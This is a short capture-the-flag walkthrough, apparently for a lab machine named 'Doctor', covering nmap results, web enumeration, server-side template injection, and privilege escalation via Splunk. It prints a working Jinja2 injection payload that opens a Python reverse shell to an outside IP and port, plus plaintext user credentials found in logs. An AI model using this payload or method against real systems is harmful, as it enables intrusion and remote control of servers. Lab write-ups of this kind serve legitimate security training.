# doctors



### nmap

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Doctor
8089/tcp open  ssl/http Splunkd httpd
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Splunkd
|_http-title: splunkd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2020-09-06T15:57:27
|_Not valid after:  2023-09-06T15:57:27
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel



#### web



![image-20201006194015139](doctors.assets/image-20201006194015139.png)

vhosting is enabled

```
domain						doctors.htb
```



- login form appears when using domain name

![image-20201006194350182](doctors.assets/image-20201006194350182.png)



- reviewing the source code we find a archive 

![image-20201006195014885](doctors.assets/image-20201006195014885.png)





#### exploit



```
server side template injection is present
```

![image-20201006195557863](doctors.assets/image-20201006195557863.png)

![image-20201006195622430](doctors.assets/image-20201006195622430.png)



### shell

- posting this in comment gives us a reverse shell

```
</title></item>{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.43\",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\", \"-i\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
```



- template injection is in the header

![image-20201006200150400](doctors.assets/image-20201006200150400.png)



### privilege escalation

- for user shaun found credentials in /var/log/apache2

![image-20201006200624822](doctors.assets/image-20201006200624822.png)



##### credentials

```
username: shaun
password: Guitar123
```



![image-20201006200930742](doctors.assets/image-20201006200930742.png)



##### root

for root we need will use splunk priv esc method using splunkwhisperer

[github repository](https://github.com/cnotin/SplunkWhisperer2)

got the root hash

![image-20201006201235091](doctors.assets/image-20201006201235091.png)